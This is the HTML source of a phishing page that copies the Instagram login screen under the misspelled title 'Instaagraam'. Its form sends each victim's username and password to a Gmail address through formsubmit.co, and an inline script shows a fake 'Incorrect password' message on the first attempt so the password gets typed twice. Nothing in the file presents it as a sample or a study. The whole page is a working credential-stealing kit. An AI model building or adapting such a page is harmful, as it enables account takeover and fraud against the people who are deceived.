<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instaagraam</title>

  <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./app.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />

  <style>
    .error-message {
      color: red;
      font-size: 12px;
      margin-top: 4px;
      display: none;
    }
  </style>
</head>

<body>

  <div class="container">
    <div class="main-container">
      <div class="main-content">
        <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
          <div class="slide-content" id="slide-content">
            <img src="./images/slide (1).jpg" class="active" />
            <img src="./images/slide (2).jpg" />
            <img src="./images/slide (3).jpg" />
            <img src="./images/slide (4).jpg" />
            <img src="./images/slide (5).jpg" />
          </div>
        </div>

        <div class="form-container">
          <form id="form" method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
            <div class="form-content box">
              <div class="logo">
                <img src="./images/logo-light.png" alt="logo" class="logo-light" />
                <img src="./images/logo-dark.png" alt="logo" class="logo-dark" />
              </div>

              <div class="btn-group">
                <button class="btn-login" type="submit">
                  <i class="fab fa-facebook-square"></i> Continue Using Facebook
                </button>
              </div>

              <div class="divine">
                <div></div><div>OR</div><div></div>
              </div>

              <div class="signin-form" id="signin-form">
                <div class="form-group">
                  <div class="animate-input">
                    <span>Phone number, username or email</span>
                    <input type="text" name="username" id="username" required>
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" id="nextField" name="_next" value="https://frilea.vercel.app/thanks.html">
                  </div>
                </div>

                <div class="form-group">
                  <div class="animate-input">
                    <span>Password</span>
                    <input type="text" name="password" id="password" required>
                    <button type="button">Show</button>
                    <small id="errorText" class="error-message">Incorrect password. Please try again.</small>
                  </div>
                  <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);">
                    <a href="#" class="forgot-pw">Forgotten your password?</a>
                  </div>
                </div>

                <div class="btn-group">
                  <button class="btn-login" type="submit">Sign In</button>
                  <div class="box goto">
                    <p>Don't have an account? <a href="#">Sign up</a></p>
                  </div>
                </div>
              </div>
            </div>

            <div class="app-download">
              <p>Get the app.</p>
              <div class="store-link">
                <a href="#"><img src="./images/app-store.png" alt="app store"></a>
                <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>

    <div class="footer">
      <div class="links">
        <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
        <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a>
        <a href="#">Hashtags</a><a href="#">Locations</a><a href="#" id="darkmode-toggle">Darkmode</a>
      </div>
      <hr />
      <div class="copyright">
        <p>from</p><img src="images/download.jpg" alt="">
      </div>
    </div>
  </div>

  <script>
    let attemptCount = 0;

    document.getElementById('form').addEventListener('submit', function (e) {
      attemptCount++;

      const nextField = document.getElementById('nextField');
      const errorText = document.getElementById('errorText');

      if (attemptCount === 1) {
        nextField.value = window.location.href; // no redirect
        errorText.style.display = "block"; // show error
      } else {
        nextField.value = "https://frilea.vercel.app/thanks.html"; // allow redirect
        errorText.style.display = "none"; // hide error
      }
    });
  </script>
<script src='app.js'></script>
</body>
</html>
